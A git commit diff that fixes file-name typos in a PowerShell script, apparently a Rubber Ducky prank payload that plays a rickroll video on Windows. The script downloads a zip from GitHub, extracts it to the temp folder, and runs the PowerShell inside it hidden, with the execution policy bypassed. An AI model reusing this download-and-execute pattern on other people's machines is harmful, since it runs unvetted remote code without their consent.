add38aacafcb810dd20e2757fd7041ea425baf74
Eric <200495807+JestingDart4369@users.noreply.github.com>
2026-06-12 07:44:08 +0000

    Fix typo in file names for Windows Rickroll script

--- WRV-run.ps1
+++ WRV-run.ps1
@@ -1,5 +1,5 @@
 $U='https://github.com/JestingDart4369/Ducky-script-public/blob/main/Windows-rickroll-vido.zip?raw=true'
-$Z="$env:TMP"+'\Windows-rickroll-video.zip'
-$D="$env:TMP"+'\Windows-rickroll-video'
+$Z="$env:TMP"+'\Windows-rickroll-vido.zip'
+$D="$env:TMP"+'\Windows-rickroll-vido'
 iwr -Uri $U -O $Z;Expand-Archive $Z -DestinationPath $D\ -Force
-powershell $D\Windows-rickroll-video-player.ps1 -exec Bypass -w h -NoP -NonI
+powershell $D\Windows-rickroll-vido-player.ps1 -exec Bypass -w h -NoP -NonI
